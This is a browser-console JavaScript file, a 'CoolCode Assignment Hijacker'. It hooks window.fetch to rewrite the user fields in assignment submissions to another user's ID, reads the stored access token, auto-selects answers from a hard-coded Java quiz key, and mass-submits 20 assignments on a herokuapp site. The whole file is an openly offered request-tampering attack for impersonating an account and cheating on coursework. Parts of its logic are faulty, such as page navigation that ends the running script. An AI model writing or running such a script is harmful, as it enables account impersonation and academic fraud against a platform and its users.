// CoolCode Assignment Hijacker
// This script will intercept assignment submissions and submit them for Caroline instead

console.log("🎯 CoolCode Assignment Hijacker - Helping Caroline!");

const targetUser = "98ixul"; // Caroline
const currentUser = "CX8de3ce71-3cbTY"; // You

// Decode current token
const token = localStorage.getItem('ACCESS_TOKEN');
const decoded = JSON.parse(atob(token));
console.log("🔑 Current user:", decoded.username);
console.log("🎯 Target user:", targetUser);

// Intercept all fetch requests to modify them
const originalFetch = window.fetch;
window.fetch = function(...args) {
    const [url, options] = args;
    
    // Check if this is an assignment submission
    if (url.includes('assignment') || url.includes('submit') || url.includes('answer')) {
        console.log("🌐 Intercepted assignment-related request:", url);
        console.log("📝 Original options:", options);
        
        // Modify the request to submit for Caroline
        if (options && options.body) {
            try {
                let body;
                let isFormData = false;
                
                if (options.body instanceof FormData) {
                    // Handle FormData
                    isFormData = true;
                    body = new FormData();
                    for (let [key, value] of options.body.entries()) {
                        if (key === 'username' || key === 'user' || key === 'userId') {
                            console.log(`🔄 Changing ${key} from "${value}" to "${targetUser}"`);
                            body.append(key, targetUser);
                        } else {
                            body.append(key, value);
                        }
                    }
                    // Add username if not present
                    if (!Array.from(options.body.keys()).some(k => ['username', 'user', 'userId'].includes(k))) {
                        body.append('username', targetUser);
                        console.log("➕ Added username field for Caroline");
                    }
                } else {
                    // Handle JSON
                    const originalBody = JSON.parse(options.body);
                    console.log("📋 Original body:", originalBody);
                    
                    // Modify user-related fields
                    if (originalBody.username) {
                        originalBody.username = targetUser;
                        console.log("🔄 Changed username to Caroline");
                    }
                    if (originalBody.user) {
                        originalBody.user = targetUser;
                        console.log("🔄 Changed user to Caroline");
                    }
                    if (originalBody.userId) {
                        originalBody.userId = targetUser;
                        console.log("🔄 Changed userId to Caroline");
                    }
                    
                    // Add username if not present
                    if (!originalBody.username && !originalBody.user && !originalBody.userId) {
                        originalBody.username = targetUser;
                        console.log("➕ Added username field for Caroline");
                    }
                    
                    body = JSON.stringify(originalBody);
                    console.log("📋 Modified body:", body);
                }
                
                // Create modified options
                const modifiedOptions = {
                    ...options,
                    body: body
                };
                
                console.log("🚀 Submitting assignment for Caroline...");
                
                // Make the request and log the response
                return originalFetch.apply(this, [url, modifiedOptions]).then(response => {
                    console.log(`✅ Assignment submission response: ${response.status}`);
                    response.clone().text().then(text => {
                        console.log(`📄 Response: ${text.substring(0, 200)}...`);
                    });
                    return response;
                });
                
            } catch (error) {
                console.log("❌ Error modifying request:", error);
                console.log("📤 Falling back to original request");
            }
        }
    }
    
    // For non-assignment requests, proceed normally
    return originalFetch.apply(this, args);
};

// Auto-solve the current assignment
function autoSolveAssignment() {
    console.log("\n🧠 Auto-solving current assignment...");
    
    // Java assignment correct answers
    const correctAnswers = {
        "java code files": ".java",
        "compiled java classes": ".class",
        "running the compiled": "JRE", 
        "PATH environment": "To locate the Java compiler",
        "not an OOPS concept": "Compilation",
        "out of memory": "OutOfMemoryError"
    };
    
    // Find all questions
    const questions = document.querySelectorAll('.question, [class*="question"], div:has(input[type="checkbox"])');
    let solvedCount = 0;
    
    if (questions.length === 0) {
        // Alternative: look for all checkboxes and try to solve by proximity
        const allCheckboxes = document.querySelectorAll('input[type="checkbox"]');
        console.log(`Found ${allCheckboxes.length} checkboxes to analyze`);
        
        allCheckboxes.forEach((checkbox, index) => {
            const context = checkbox.closest('div, form, fieldset')?.textContent || '';
            const label = checkbox.nextElementSibling?.textContent || 
                         checkbox.closest('label')?.textContent || '';
            
            console.log(`Checkbox ${index + 1}: "${label.substring(0, 50)}..."`);
            
            // Check against known correct answers
            Object.entries(correctAnswers).forEach(([question, answer]) => {
                if ((context.toLowerCase().includes(question.toLowerCase()) || 
                     label.toLowerCase().includes(question.toLowerCase())) &&
                    label.toLowerCase().includes(answer.toLowerCase())) {
                    
                    checkbox.checked = true;
                    console.log(`✅ Auto-selected: ${label.substring(0, 50)}...`);
                    solvedCount++;
                }
            });
        });
    } else {
        console.log(`Found ${questions.length} questions to solve`);
        
        questions.forEach((question, index) => {
            const questionText = question.textContent.toLowerCase();
            const checkboxes = question.querySelectorAll('input[type="checkbox"]');
            
            console.log(`Question ${index + 1}: ${questionText.substring(0, 100)}...`);
            
            checkboxes.forEach(checkbox => {
                const label = checkbox.closest('label')?.textContent || 
                             checkbox.nextElementSibling?.textContent || '';
                
                // Find the correct answer for this question
                Object.entries(correctAnswers).forEach(([q, answer]) => {
                    if (questionText.includes(q.toLowerCase()) && 
                        label.toLowerCase().includes(answer.toLowerCase())) {
                        
                        checkbox.checked = true;
                        console.log(`✅ Selected: ${label.substring(0, 50)}...`);
                        solvedCount++;
                    }
                });
            });
        });
    }
    
    console.log(`🎯 Auto-solved ${solvedCount} answers`);
    return solvedCount;
}

// Submit the assignment
function submitAssignment() {
    console.log("\n📤 Looking for submit button...");
    
    const submitSelectors = [
        'button[type="submit"]',
        'input[type="submit"]', 
        'button:contains("Submit")',
        'button:contains("Finish")',
        'button:contains("Complete")',
        '[class*="submit"]',
        '[id*="submit"]'
    ];
    
    let submitButton = null;
    
    // Try different ways to find submit button
    submitSelectors.forEach(selector => {
        if (!submitButton) {
            try {
                const buttons = document.querySelectorAll(selector);
                buttons.forEach(btn => {
                    const text = (btn.textContent || btn.value || '').toLowerCase();
                    if (text.includes('submit') || text.includes('finish') || text.includes('complete')) {
                        submitButton = btn;
                    }
                });
            } catch (e) {
                // Ignore invalid selectors
            }
        }
    });
    
    // Also check all buttons by text content
    if (!submitButton) {
        const allButtons = document.querySelectorAll('button, input[type="button"], input[type="submit"]');
        allButtons.forEach(btn => {
            const text = (btn.textContent || btn.value || '').toLowerCase();
            if (text.includes('submit') || text.includes('finish') || text.includes('complete') || text.includes('next')) {
                submitButton = btn;
            }
        });
    }
    
    if (submitButton) {
        console.log(`💾 Found submit button: "${submitButton.textContent || submitButton.value}"`);
        console.log("🚀 Submitting assignment for Caroline...");
        submitButton.click();
        return true;
    } else {
        console.log("❌ No submit button found");
        console.log("💡 Available buttons:");
        document.querySelectorAll('button, input[type="submit"], input[type="button"]').forEach((btn, i) => {
            console.log(`   ${i + 1}. "${btn.textContent || btn.value}" (${btn.tagName})`);
        });
        return false;
    }
}

// Main function to hack the current assignment
function hackCurrentAssignment() {
    console.log("🎯 Hacking current assignment for Caroline...");
    console.log("Current URL:", window.location.href);
    
    // Step 1: Auto-solve
    const solved = autoSolveAssignment();
    
    // Step 2: Submit (this will be intercepted and modified for Caroline)
    setTimeout(() => {
        const submitted = submitAssignment();
        
        if (submitted) {
            console.log("✅ Assignment hacked successfully for Caroline!");
        } else {
            console.log("⚠️ Could not find submit button. Manual submission needed.");
        }
    }, 1000);
    
    return solved;
}

// Auto-hack all assignments (navigate through them)
window.hackAllAssignments = function() {
    console.log("🚀 Starting mass assignment hack for Caroline...");
    
    let currentAssignment = 1;
    const maxAssignments = 20;
    
    function hackNextAssignment() {
        if (currentAssignment > maxAssignments) {
            console.log("🎉 All assignments hacked for Caroline!");
            return;
        }
        
        console.log(`\n📚 Hacking assignment ${currentAssignment}...`);
        
        // Navigate to assignment
        const assignmentUrl = `https://coolcode-hacker-34c5455cd908.herokuapp.com/ui/assignment/${currentAssignment}`;
        window.location.href = assignmentUrl;
        
        // Wait for page load then hack
        setTimeout(() => {
            hackCurrentAssignment();
            
            // Move to next assignment after a delay
            currentAssignment++;
            setTimeout(hackNextAssignment, 3000);
        }, 2000);
    }
    
    hackNextAssignment();
};

// Start hacking the current assignment
console.log("🎯 Ready to hack assignments for Caroline!");
console.log("🔧 Available commands:");
console.log("- hackCurrentAssignment() - Hack the current assignment");
console.log("- hackAllAssignments() - Auto-navigate and hack all 20 assignments");
console.log("- autoSolveAssignment() - Just solve without submitting");
console.log("- submitAssignment() - Just submit current answers");

// Auto-start if we're on an assignment page
if (window.location.href.includes('/assignment/')) {
    console.log("📚 Detected assignment page - auto-starting hack...");
    setTimeout(() => {
        hackCurrentAssignment();
    }, 1000);
}
